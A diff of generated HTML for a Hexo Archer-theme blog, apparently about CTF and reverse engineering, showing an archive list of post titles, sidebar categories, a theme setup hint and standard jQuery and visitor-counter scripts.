+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/07/29/ollvm/" >anti-ollvm</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/07/29/kctf2019-q1/" >kctf2019-晋级赛Q1</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/07/29/xnuca-final/" >X-NUCA 2018个人赛/决赛PWN</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/07/29/MYSQL/" >网站开发入门-MYSQL数据库的基础使用</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/07/29/suyuan/" >2017国赛-re200-溯源</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/07/29/suanfa/" >算法设计</a>
+        </li>
+    
+    </div>
   </div>
-</body>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="RE"><span class="iconfont-archer">&#xe60a;</span>RE</span>
+    
+        <span class="sidebar-category-name" data-categories="二进制"><span class="iconfont-archer">&#xe60a;</span>二进制</span>
+    
+        <span class="sidebar-category-name" data-categories="WEB"><span class="iconfont-archer">&#xe60a;</span>WEB</span>
+    
+        <span class="sidebar-category-name" data-categories="PWN"><span class="iconfont-archer">&#xe60a;</span>PWN</span>
+    
+        <span class="sidebar-category-name" data-categories="CVE"><span class="iconfont-archer">&#xe60a;</span>CVE</span>
+    
+        <span class="sidebar-category-name" data-categories="FE"><span class="iconfont-archer">&#xe60a;</span>FE</span>
+    
+        <span class="sidebar-category-name" data-categories="算法"><span class="iconfont-archer">&#xe60a;</span>算法</span>
+    
+        <span class="sidebar-category-name" data-categories="Crypto"><span class="iconfont-archer">&#xe60a;</span>Crypto</span>
+    
+        <span class="sidebar-category-name" data-categories="balabala"><span class="iconfont-archer">&#xe60a;</span>balabala</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "John Doe"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+     
+    </body>
 </html>
+
+
